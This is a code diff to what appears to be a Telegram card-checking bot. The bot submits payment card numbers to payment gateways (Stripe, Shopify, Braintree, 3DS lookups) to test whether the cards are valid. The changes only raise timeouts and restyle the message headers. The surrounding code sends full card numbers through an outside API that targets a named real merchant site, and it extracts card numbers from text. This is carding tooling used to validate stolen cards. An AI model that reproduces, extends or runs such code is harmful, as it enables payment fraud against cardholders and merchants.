@@ -1505,7 +1505,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         # Call main API
         api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
         async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=45) as resp:
+            async with session.get(api_url, timeout=55) as resp:
                 if resp.status != 200:
                     raise Exception(f"HTTP {resp.status}")
                 data = await resp.json()
@@ -2515,7 +2515,7 @@ async def process_seturl(user, user_id, site_input, processing_msg):
         site_status = "✅ 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝" if status.lower() == "true" else "❌ 𝐅𝐚𝐢𝐥𝐞𝐝"
 
         formatted_msg = (
-            f"═══[ <b>{site_status}</b> ]═══\n"
+            f"◇━━〔 <b>{site_status}</b> 〕━━◇\n"
             f"{bullet_link} <b>𝐒𝐢𝐭𝐞</b> ➵ <code>{escape(site_input)}</code>\n"
             f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➵ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙉𝙤𝙧𝙢𝙖𝙡\n"
             f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➵ <i>{escape(response)}</i>\n"
@@ -2784,7 +2784,7 @@ async def process_card_check(user, card_input, custom_url, msg):
         bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
         formatted_msg = (
-            "═══[ 𝑨𝒖𝒕𝒐𝒔𝒉𝒐𝒑𝒊𝒇𝒚 ]═══\n"
+            "◇━━〔 𝑨𝒖𝒕𝒐𝒔𝒉𝒐𝒑𝒊𝒇𝒚 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝       ➵ <code>{card_input}</code>\n"
             f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   ➵ <i>{escape(gateway)}</i>\n"
             f"{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭     ➵ {price} 💸\n"
@@ -2935,7 +2935,7 @@ async def run_site_check(site_url: str, msg, user):
         bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
         formatted_msg = (
-            f"═══[ #𝘀𝗵𝗼𝗽𝗶𝗳𝘆 ]═══\n\n"
+            f"◇━━〔 #𝘀𝗵𝗼𝗽𝗶𝗳𝘆 〕━━◇\n\n"
             f"{bullet_link} 𝐒𝐢𝐭𝐞       ➵ <code>{escape(site_url)}</code>\n"
             f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲    ➵ {escape(gateway)}\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➵ <i>{escape(response)}</i>\n"
@@ -3531,9 +3531,9 @@ async def fl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         extracted_cards_text = "_No cards found in the provided text\\._"
 
     msg = (
-        f"╭━━━ [ 💳 𝗘𝘅𝘁𝗿𝗮𝗰𝘁𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ] ━━━⬣\n"
+        f"╭━ [ 💳 𝗘𝘅𝘁𝗿𝗮𝗰𝘁𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ] \n"
         f"┣ ❏ Total ➳ {count}\n"
-        f"╰━━━━━━━━━━━━━━━━━━━━⬣\n\n"
+        f"╰━━━━━━━\n\n"
         f"{extracted_cards_text}"
     )
 
@@ -3718,9 +3718,9 @@ async def run_vbv_check(msg, update, card_data: str):
     safe_country = html.escape(f"{country_name} {country_flag}".strip())
 
     text = (
-        "═══[ #𝟯𝗗𝗦 𝗟𝗼𝗼𝗸𝘂𝗽 ]═══\n"
+        "◇━━〔 #𝟯𝗗𝗦 𝗟𝗼𝗼𝗸𝘂𝗽 〕━━◇\n"
         f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{safe_card}</code>\n"
-        f"{bullet_link} BIN ➵ <code>{bin_number}</code>\n"
+        f"{bullet_link} 𝐁𝐈𝐍 ➵ <code>{bin_number}</code>\n"
         f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{safe_reason} {check_mark}</i>\n"
         "――――――――――――――――\n"
         f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{safe_brand}</code>\n"
@@ -3884,7 +3884,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
     }
 
     try:
-        timeout = aiohttp.ClientTimeout(total=20)
+        timeout = aiohttp.ClientTimeout(total=50)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(API_URL, params=params) as resp:
                 if resp.status != 200:
